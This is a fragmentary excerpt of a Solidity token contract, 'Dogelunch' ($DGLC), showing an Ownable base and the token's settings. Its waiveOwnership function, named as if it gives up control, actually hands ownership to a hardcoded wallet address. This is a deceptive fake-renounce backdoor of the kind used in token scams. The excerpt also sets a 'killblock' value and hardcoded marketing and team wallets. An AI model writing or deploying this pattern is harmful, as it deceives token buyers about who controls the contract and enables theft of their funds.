...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x8bA222C41810a78d19627Ce9434C5D9DE1784164);
    }
...
contract Dogelunch is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Dogelunch";
    string private _symbol = "$DGLC";
    uint8 private _decimals = 9;

    uint public launchedBlock;
    uint public killblock = 2;
    bool public isLaunch = false;
    address payable public marketingWalletAddress = payable(0xBE41824005200BfC39739603DeF598002117d3f3);
    address payable public teamWalletAddress = payable(0x4b1D09F4128AC3150C68b4762f74d453EE7F6D57);
